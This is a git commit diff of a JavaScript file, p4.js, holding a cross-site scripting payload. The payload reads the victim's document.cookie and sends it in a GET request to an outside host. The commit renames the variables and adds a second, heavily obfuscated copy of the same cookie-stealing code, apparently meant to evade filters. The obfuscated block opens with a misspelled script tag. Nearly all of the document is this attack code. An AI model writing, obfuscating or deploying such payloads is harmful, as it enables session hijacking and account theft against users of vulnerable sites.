ed71ef486abff5c3e86e6b1b4b33ebe456e36f25
Angelopezmacc <49574428+Angelopezmacc@users.noreply.github.com>
2022-03-25 13:22:19 -0500

    Update p4.js

--- p4.js
+++ p4.js
@@ -1,12 +1,19 @@
+// Original function
 <script>
-  var c = document.cookie;
-  const Http = new XMLHttpRequest();
-  var url_destino = 'https://google.com/' + c;
-  const url= url_destino;
-  Http.open("GET", url);
-  Http.send();
+	var gato = document.cookie;
+	const perro = new XMLHttpRequest();
+	var humano = 'https://google.com/' + gato;
+	const url= humano;
+	perro.open("GET", url);
+	perro.send();
 
-  Http.onreadystatechange = (e) => {
-    console.log(Http.responseText)
-  }
+	perro.onreadystatechange = (e) => {
+	  console.log(perro.responseText)
+	}
+</script>
+
+// Obfuscated function
+
+<scipt>
+function _0x28d8(){var _0x227edd=['203kQNGFk','44580LuJEsn','64hqEEhq','8961095hNhQkf','open','80DlJfdM','190389cQcsaq','responseText','957504JzGNcl','2379gPGLiX','118215MhGiCX','27280CKnyvG','496YKwWYj','GET','log','https://google.com/','onreadystatechange'];_0x28d8=function(){return _0x227edd;};return _0x28d8();}var _0x245f1a=_0x22d6;(function(_0x105cf4,_0x366557){var _0x36cf1e=_0x22d6,_0x450621=_0x105cf4();while(!![]){try{var _0x2ae787=-parseInt(_0x36cf1e(0x1d6))/0x1+parseInt(_0x36cf1e(0x1dc))/0x2*(-parseInt(_0x36cf1e(0x1d9))/0x3)+-parseInt(_0x36cf1e(0x1d2))/0x4*(parseInt(_0x36cf1e(0x1d1))/0x5)+-parseInt(_0x36cf1e(0x1d8))/0x6+parseInt(_0x36cf1e(0x1d0))/0x7*(parseInt(_0x36cf1e(0x1db))/0x8)+parseInt(_0x36cf1e(0x1da))/0x9*(-parseInt(_0x36cf1e(0x1d5))/0xa)+parseInt(_0x36cf1e(0x1d3))/0xb;if(_0x2ae787===_0x366557)break;else _0x450621['push'](_0x450621['shift']());}catch(_0x2da7bb){_0x450621['push'](_0x450621['shift']());}}}(_0x28d8,0x1d17a));var gato=document['cookie'];const perro=new XMLHttpRequest();function _0x22d6(_0x1c8a82,_0x363ffc){var _0x28d855=_0x28d8();return _0x22d6=function(_0x22d601,_0x488127){_0x22d601=_0x22d601-0x1ce;var _0x90fa2f=_0x28d855[_0x22d601];return _0x90fa2f;},_0x22d6(_0x1c8a82,_0x363ffc);}var humano=_0x245f1a(0x1ce)+gato;const url=humano;perro[_0x245f1a(0x1d4)](_0x245f1a(0x1dd),url),perro['send'](),perro[_0x245f1a(0x1cf)]=_0x3a7845=>{var _0x1528f3=_0x245f1a;console[_0x1528f3(0x1de)](perro[_0x1528f3(0x1d7)]);};
 </script>
